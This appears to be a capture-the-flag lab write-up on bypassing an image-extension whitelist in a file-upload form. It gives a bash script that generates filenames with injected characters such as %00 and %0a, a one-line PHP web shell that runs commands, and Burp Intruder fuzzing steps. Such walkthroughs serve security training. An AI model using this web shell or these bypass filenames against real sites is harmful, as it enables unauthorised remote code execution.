# Whitelist Filters

The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

In some cases whitelists may be used to prevent malicious threats for uploading unintended file formats.

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

Lets capture the upload request and fuzz the extension like in the previous exercise.&#x20;





But this time, we'll create our own wordlist. We will adapt the bash script from HTB and add two more extensions ending up with a script like this:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' 'php3' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Just paste it on your machine and press enter to execute it, and then copy the content to the Intruder's payload configuration



Again we will use the [SecList](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist to fuzz.

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

We can see the that in all the requests we get the message "Only images are allowed". However, this error message does not always reflect if the proper validation is being used.

Lets assume a scenario where this web application is only looking for matching extensions like jpg, jpeg, png and gif. To bypass this filter we'll try double extensions, to see if we can bypass it.

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

We'll intercept the upload request and add to filename parameter a file with double extension like `shell.jpg.php`. If the application is only looking for a matching extension, we should be able to bypass the filter.

Then we'll our web shell payload:

```php
<?php system($_REQUEST['cmd']); ?>
```

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

However, it looks like this method is not going to work.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Lets explore a second method called character Injection. We send our request to Intruder, and modify the filename to `shell.php§ext§.jpg`. To the payload we add the following characters:

* `%20`
* `%0a`
* `%00`
* `%0d0a`
* `/`
* `.\`
* `.`
* `…`
* `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, `shell.php%00.jpg` may be accepted by the whitelist, but interpreted like `shell.php`.

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

And it looks like we found two working characters. Lets try again with the POST request.

<figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

Send to Intruder



<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Hide all columns

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

